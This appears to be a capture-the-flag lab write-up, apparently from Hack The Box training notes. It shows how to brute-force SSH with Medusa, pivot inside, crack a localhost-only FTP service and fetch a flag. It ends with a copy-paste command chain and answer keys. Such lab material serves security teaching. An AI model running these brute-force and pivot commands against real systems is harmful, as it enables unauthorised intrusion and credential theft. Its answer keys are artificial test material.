# Section 10 — Web Services (SSH + FTP)

---

## Overview

Multi-stage attack: brute-force SSH to get a foothold, then pivot to attack internal services (FTP) that aren't exposed externally.

**Attack chain:**
```
Medusa → SSH creds → SSH session → discover FTP on localhost → Medusa → FTP creds → get flag
```

---

## Lab — SSH + FTP Brute Force

**Objective:** Crack SSH, get inside, find and crack a locally-running FTP server, retrieve flag.txt.

---

### Step 1 — Brute Force SSH

```bash
medusa -h TARGET_IP -n TARGET_PORT -u sshuser \
  -P ~/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
  -M ssh -t 3 -f
```

**Why `-t 3`:** SSH servers often rate-limit or block on too many concurrent connections. 3 threads is conservative and avoids lockout.

**Output:**
```
ACCOUNT FOUND: [ssh] Host: TARGET_IP  User: sshuser  Password: 1q2w3e4r5t [SUCCESS]
```

---

### Step 2 — SSH In and Discover Internal Services

```bash
ssh sshuser@TARGET_IP -p TARGET_PORT
```

Once in, check for listening services:

```bash
netstat -tulpn | grep LISTEN
# or
nmap localhost
```

**What to look for:** Any open ports beyond 22. Port 21 = FTP running locally (not exposed externally).

Check `/home` for username hints:
```bash
ls /home
# ftpuser folder → username is likely ftpuser
```

---

### Step 3 — Brute Force FTP from Inside the SSH Session

```bash
medusa -h 127.0.0.1 -u ftpuser \
  -P ~/SecLists/Passwords/Common-Credentials/2020-200_most_used_passwords.txt \
  -M ftp -t 5 -f
```

**Why `127.0.0.1`:** FTP is only listening on localhost — not reachable from outside. Must attack from within the SSH session.
**Why `-t 5`:** FTP handles concurrent connections better than SSH.
**Why the 2020 list:** The module uses the 2020 variant — wordlist choice matters; if one list fails, try the other.

**Output:**
```
ACCOUNT FOUND: [ftp] Host: 127.0.0.1  User: ftpuser  Password: qqww1122 [SUCCESS]
```

---

### Step 4 — Retrieve the Flag via FTP

```bash
ftp -n 127.0.0.1 21 << 'EOF'
user ftpuser qqww1122
get flag.txt /tmp/flag.txt
bye
EOF
cat /tmp/flag.txt
```

**Why `ftp -n`:** `-n` disables auto-login so you can supply credentials manually in the heredoc — works non-interactively.

**Result:**
```
HTB{SSH_and_FTP_Bruteforce_Success}
```

**Q1 Answer (FTP password):** `qqww1122`
**Q2 Answer (flag):** `HTB{SSH_and_FTP_Bruteforce_Success}`

---

## Full Command Chain (Copy-Paste)

```bash
# 1. Crack SSH
medusa -h TARGET_IP -n TARGET_PORT -u sshuser \
  -P ~/SecLists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt \
  -M ssh -t 3 -f

# 2. SSH in and enumerate
ssh sshuser@TARGET_IP -p TARGET_PORT
netstat -tulpn | grep LISTEN
ls /home

# 3. Crack FTP (run from within SSH session)
medusa -h 127.0.0.1 -u ftpuser \
  -P ~/SecLists/Passwords/Common-Credentials/2020-200_most_used_passwords.txt \
  -M ftp -t 5 -f

# 4. Get the flag (run from within SSH session)
ftp -n 127.0.0.1 21 << 'EOF'
user ftpuser PASSWORD
get flag.txt /tmp/flag.txt
bye
EOF
cat /tmp/flag.txt
```

---

## Exam Notes

- Always enumerate internal ports after getting a foothold — `netstat -tulpn` or `nmap localhost`
- Check `/home` directory for folder names → reveals likely usernames for internal services
- FTP on localhost = common pattern in labs and real environments (internal file server not meant to be public)
- If `curl` isn't available on the target, use `ftp -n` with a heredoc for non-interactive file retrieval
- SSH brute force is slow due to the protocol — keep `-t` low (3–5) to avoid bans
